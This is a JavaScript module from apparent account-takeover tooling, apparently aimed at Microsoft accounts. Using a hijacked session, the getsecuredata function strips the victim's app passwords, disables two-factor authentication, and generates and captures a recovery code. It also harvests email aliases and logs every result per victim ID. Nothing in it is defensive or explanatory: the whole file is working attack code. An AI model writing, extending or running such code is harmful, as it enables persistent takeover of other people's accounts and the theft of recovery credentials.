const disableTfa = require("../disableTfa");
const { updateExtraInformation, updateStatus } = require("../../process/helpers");
const getAliases = require("../../secure/getAliases");
const getogo = require("../../secure/getogo");
const recoveryCode = require("../../secure/recoveryCode");
const removepw = require("../../secure/removepw");
const securityInformation = require("../../secure/securityInformation");
const { normalizeEmail } = require("../../secure/aliasHelper");

async function getsecuredata(axios, uid, apiCanary, obj) {
  let securedata = {
    aliases: [],
    email: null,
    canary: null,
    disabledtfa: false,
    netid: null,
    recovery: null,
    security: null,
    securityparams: null
  };

  let securityParameters = null;
  try {
    securityParameters = await securityInformation(axios);
    if (!securityParameters) securityParameters = await securityInformation(axios);
    if (!securityParameters) securityParameters = await securityInformation(axios);
  } catch (e) {
    console.error(`[GETSECUREDATA] Error fetching securityInformation for ${uid}:`, e.message);
  }

  securedata.securityparams = securityParameters;

  if (securityParameters?.email) {
    securedata.email = normalizeEmail(String(securityParameters.email));
  } else {
    console.log(`[GETSECUREDATA] Initial email not found in securityParameters for ${uid}`);
  }

  if (securityParameters?.netId) {
    securedata.netid = securityParameters.netId;
  } else {
    console.log(`[GETSECUREDATA] Couldn't get netid for ${uid}`);
  }

  if (securityParameters?.secoptions) {
    securedata.security = securityParameters.secoptions;
    await updateExtraInformation(uid, "security", JSON.stringify(securedata.security));
  }

  if (securityParameters?.apppasswords) {
    console.log(`App passwords detected: ${securityParameters.apppasswords}`);
    try {
      const removed = await removepw(axios, apiCanary);
      if (removed) {
        console.log(`Removed App Passwords successfully!`);
        await updateExtraInformation(uid, "apppasswords", "Removed");
      } else {
        console.log(`Couldn't remove available app passwords`);
        await updateExtraInformation(uid, "apppasswords", "Couldn't remove");
      }
    } catch (e) {
      console.log(`Error removing app passwords:`, e);
      await updateExtraInformation(uid, "apppasswords", "Error removing");
    }
  } else {
    await updateExtraInformation(uid, "apppasswords", "None");
  }

  // BUG-06 FIX: Sequence stateful operations explicitly to prevent cookie/session races
  // 1. Disable 2FA
  try {
    const tfadisabled = await disableTfa(axios, apiCanary);
    if (tfadisabled) {
      securedata.disabledtfa = true;
      console.log("[GETSECUREDATA] Disabled TFA (if applicable)");
    } else {
      console.log(`[GETSECUREDATA] Couldn't disable 2FA!`);
    }
  } catch (tfaErr) {
    console.error(`[GETSECUREDATA] Error disabling TFA:`, tfaErr.message);
  }

  // 2. Fetch/Regenerate Recovery Code
  if (securityParameters?.netId) {
    try {
      let revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);
      if (!revcode) {
        console.log(`Couldn't fetch the recovery code (1st attempt, trying for 2nd)`);
        revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);
      }
      if (!revcode) {
        console.log(`Couldn't fetch the recovery code (2nd attempt, trying for 3rd)`);
        revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);
      }
      if (revcode) {
        securedata.recovery = revcode;
      }
    } catch (revErr) {
      console.error(`[GETSECUREDATA] Error generating recovery code:`, revErr.message);
    }
  }

  // 3. Fetch initial authoritative aliases state
  try {
    const result = await getAliases(axios);
    if (result) {
      const rawAliases = Array.isArray(result) ? result[0] : (result.aliases || []);
      const canary = Array.isArray(result) ? result[1] : (result.canary || null);
      const primary = Array.isArray(result) ? result[2] : (result.primary || null);

      if (rawAliases && Array.isArray(rawAliases)) {
        const cleanAliases = Array.from(
          new Set(rawAliases.map((a) => normalizeEmail(String(a || ""))).filter(Boolean))
        );
        await updateExtraInformation(uid, "oldaliases", JSON.stringify(cleanAliases));
        securedata.aliases = cleanAliases;
      }
      if (canary) {
        securedata.canary = canary;
      }
      if (primary) {
        securedata.email = normalizeEmail(String(primary));
      }
    }
  } catch (e) {
    console.error(`[GETSECUREDATA] getAliases error:`, e.message);
  }

  if (!securedata.recovery || securedata.recovery === "") {
    console.log(`Couldn't get the recovery code!`);
  } else {
    await updateStatus(uid, "recoverycode", securedata.recovery);
  }

  if (securedata.email) {
    await updateStatus(uid, "email", securedata.email);
  } else {
    console.log(`Retrying to get email!`);
    try {
      let ogo = await getogo(axios);
      if (ogo) {
        const parsed = JSON.parse(ogo);
        securedata.email = parsed?.email ? normalizeEmail(String(parsed.email)) : null;
        if (securedata.email) {
          await updateStatus(uid, "email", securedata.email);
        } else {
          await updateStatus(uid, "email", "Couldn't grab");
        }
      } else {
        await updateStatus(uid, "email", "Couldn't grab");
      }
    } catch (e) {
      console.log(`Failed to fetch email from getogo:`, e.message);
      await updateStatus(uid, "email", "Couldn't grab");
    }
  }

  return securedata;
}

module.exports = getsecuredata;
